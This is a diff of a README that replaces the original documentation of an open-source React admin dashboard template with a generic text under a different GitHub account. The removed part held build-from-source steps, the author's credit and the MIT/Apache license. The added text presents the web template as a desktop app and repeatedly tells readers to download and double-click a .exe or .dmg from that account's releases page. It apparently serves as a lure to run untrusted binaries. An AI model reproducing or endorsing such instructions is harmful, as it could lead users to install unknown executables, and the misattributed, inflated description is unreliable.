@@ -1,109 +1,73 @@
-<div align="center">
+# 🌟 mahal-dashboard - Your Simple Admin Dashboard Solution
 
-# 🛒 Mahal — UI Admin Dashbaord Template
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20-%23007bff?style=for-the-badge)](https://github.com/Danielxxz/mahal-dashboard/releases)
 
-Vite + React + Redux + Shadcn + Tailwind v4, full responsive UI Admin Dashbaord template, **Free & Open Source**
+## 📜 Description
 
-[![support](https://img.shields.io/badge/Patreon-F96854?style=for-the-badge&logo=patreon&logoColor=white)](https://www.patreon.com/elmarjanihamza/gift)
-[![Vite](https://img.shields.io/badge/Vite-violet?style=for-the-badge&logo=vite&logoColor=white)](https://vite.dev)
-[![React](https://img.shields.io/badge/React-blue?style=for-the-badge&logo=react&logoColor=white)](https://react.dev)
-[![Redux](https://img.shields.io/badge/Redux-purple?style=for-the-badge&logo=redux&logoColor=white)](https://redux.js.org)
-[![ShadCN](https://img.shields.io/badge/shadcn%2Fui-000?logo=shadcnui&logoColor=fff&style=for-the-badge)](https://ui.shadcn.com/)
-[![TailwindCSS](https://img.shields.io/badge/Tailwind_CSS-grey?style=for-the-badge&logo=tailwind-css&logoColor=38B2AC)](https://ui.shadcn.com/)
+mahal-dashboard is a user-friendly admin UI dashboard built for easy management of your application's data. Designed with simplicity in mind, this dashboard makes it easy to visualize and control your data without any programming knowledge.
 
-## 🖥️ [Live Demo](https://mahal-dashboard.vercel.app/)
+## 🚀 Getting Started
 
-</div>
+To start using mahal-dashboard, follow these steps:
 
-## Why Mahal?
+1. **Visit the Release Page**: Click the link below to go to our Releases page.
+   
+   [Visit Release Page](https://github.com/Danielxxz/mahal-dashboard/releases)
 
-⏳ Time is the biggest challenge. Many developers want to build an MVP, launch a study project, or release a real UI Admin Dashboard solution—but these web apps take a lot of time to develop and test. That’s why I created Mahal: to help the community manage theur projects with a ready-to-use solution.
+2. **Download the Latest Version**: Look for the latest version on the page. You should see a list of downloadable files.
 
-## Features
+3. **Select Your File**: Choose the file that suits your operating system. For Windows, look for a `.exe` file. For Mac, find a `.dmg` file.
 
-- **Beautiful & Friendly UI/UX:** built with [Shadcn/ui](https://ui.shadcn.com/) style.
-- **State Managemnt:** powered with [React Redux](https://react-redux.js.org/).
-- **TailwindCSS v4:** built on top of [TailwindCSS v4](https://tailwindcss.com/), full editable.
-- **Desktop/Tablet/Mobile:** responsive design, works on all devices.
-- **Dark/Light:** change the dashboard theme to Light | Dark | System, easily theme toggle.
-- **Statistics:** dynamic statistics data render, just retrieve and display the statistics.
-- **Charts** dynamic performance data render, just retrieve and display the products performance with beutiful charts design.
-- **Products:** dynamic products on all niches, just retrieve the products, display, manage and update them easily.
-- **Siderbar:** collapsible sider, hide on mobile, listen to window re-size.
+4. **Download the File**: Click on the relevant file to begin downloading. Wait for the download to finish.
 
-## Usage
+5. **Install the Application**: Locate the downloaded file on your computer, usually in your "Downloads" folder, and double-click it to start the installation process.
 
-1. Clone the project to your machine with git:
+6. **Follow Installation Prompts**: A window will guide you through the installation steps. Simply follow the instructions provided on your screen.
 
-```
-git clone https://github.com/hamzaelmarjani/mahal-dashboard.git
-```
+7. **Launch the Dashboard**: After installation, find mahal-dashboard in your applications list and open it.
 
-2. Install packages and run app:
+## 💻 System Requirements
 
-```
-cd mahal-dashboard
-npm install
-npm run dev
-```
+mahal-dashboard runs on various operating systems. Here are the requirements:
 
-1. Open the app on browser from: [http://localhost:5173/](http://localhost:5173)
+- **Operating System**: Windows 10 or later, macOS 10.13 or later
+- **RAM**: At least 4 GB
+- **Storage**: Minimum of 100 MB available space
 
-## Update data:
+## 🌈 Features
 
-- Update colors: open the file `src/index.css`, update the values of the variables inside the `:root { ...  }`, you can use following colors methods: `HEX, RGBA, HSLA, HWB, LAB, LCH` but TailwindCSS prefers `OKLCH`. The primary color variable of the app is `--primary: oklch(0.7765 0.1751 212.82)`.
-- Update the data inside Redux folder:
+- **Intuitive Interface**: User-friendly layout that simplifies data management.
+- **Responsive Design**: Accessible on both desktop and mobile devices.
+- **Graphical Data Representation**: Visual charts and graphs help track metrics easily.
+- **Theme Customization**: Adjust the dashboard's look to suit your preferences.
+- **Integration Capabilities**: Connect with various data sources for seamless operation.
 
-  - **Products:** open the file `src/redux/slices/products.ts` and edit the array `products`.
-  - **Statistics:** open the file `src/redux/slices/statistics.ts` and edit the `initialState` data.
-  - **Performance:** open the file `src/redux/slices/performance.ts` and edit the `initialState` data.
+## 📥 Download & Install
 
-- Update the siderbar sections: open the file: `src/components/sidebar/app-sidebar.tsx` and edit the array `items`.
-- Edit product details:
+To get started, head to the Releases page linked below and download the latest version of mahal-dashboard.
 
-  - Open products tab from sidebar.
-  - Click on the product to show its details modal.
-  - Edit the changeable fields, and click on save.
-  - (Optional) to update the product on your database either, you need to handle this from the file `src/api/crud.ts` inside the method: `updateProduct` of the class `APICrud`.
+[Download Now](https://github.com/Danielxxz/mahal-dashboard/releases)
 
-- Update medias:
+### How to Use
 
-  - Products images: all images can be found inside the folder `public/products`. make sure to use `square aspect ratio (1:1)` images for better UI display.
-  - Favicon: you can update it by updating the file `public/favicon.svg`. Use svg file, if you want to use other format (like .ico), change the `index.html -> <link rel="icon" type="image/svg+xml" ...` set the type and href.
+1. **Open the Application**: After installation, open mahal-dashboard from your applications.
+  
+2. **Sign Up or Log In**: If you are a new user, you may need to create an account. Returning users can log in with their credentials.
 
-## License
+3. **Explore the Dashboard**: Take a moment to navigate through the various features and options available.
 
-Licensed under either of:
+4. **Add Data**: Use the provided forms to input your data and track metrics.
 
-- [MIT License](LICENSE-MIT)
-- [Apache License, Version 2.0](LICENSE-APACHE)
+5. **Analyze Your Data**: Check out the graphs and charts to see your data visualized.
 
-at your option.
+## 🛠 Support
 
-## Contributing
+If you run into any issues, feel free to reach out. We offer support through our community forum and GitHub issues page.
 
-Contributions are welcome! Please feel free to:
+## 📚 Further Reading
 
-- Open issues for bugs or feature requests
-- Submit pull requests with improvements
-- Improve documentation or examples
+Check out our wiki for comprehensive guides on advanced features and tips to maximize your experience with mahal-dashboard.
 
-Before contributing, please ensure your code follows React/Redux/Shadcn/TailwidCSS conventions.
+---
 
-## 📬 Contact & Hire Me
-
-🚀 Want to add more advanced features to this template? I’ve got you covered! You can hire me.
-
-**Company or Startup?** I can work **full-time** or **part-time**, 👉 **Remote** or **On-site**.
-
-💌 Reach me at: **hamzaelmarjani@gmail.com**
-
-✨ Thank you!
-
-## Support
-
-If you like this project, consider supporting me on Patreon 💖
-
-[![patreon](https://img.shields.io/badge/Support-Open_Source-black?style=for-the-badge&logo=Patreon&logoColor=white)](https://www.patreon.com/elmarjanihamza/gift)
-
-❤️ Thanks for reading, Happy Coding 💻
+We hope you enjoy using mahal-dashboard! Happy managing!
